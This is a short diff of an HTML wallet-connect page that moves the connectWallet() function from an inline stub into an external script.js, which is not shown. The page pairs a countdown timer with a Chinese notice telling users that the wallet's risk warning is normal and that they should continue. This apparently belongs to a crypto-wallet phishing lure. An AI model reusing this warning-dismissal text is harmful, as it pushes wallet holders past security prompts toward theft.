@@ -18,15 +18,12 @@
             <button id="okButton" onclick="connectWallet()">OK</button>
         </div>
         <div class="warning">
-连接手机钱包会出现风险提示这是正常的请继续
+            连接手机钱包会出现风险提示这是正常的请继续
         </div>
     </div>
     <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js" type="application/javascript"></script>
+    <script src="script.js"></script> <!-- 引用外部的 script.js 文件 -->
     <script>
-        function connectWallet() {
-            console.log("Connecting wallet...");
-        }
-
         let countdown = 120;
         const countdownElement = document.getElementById('countdown');
         const progressElement = document.getElementById('progress');
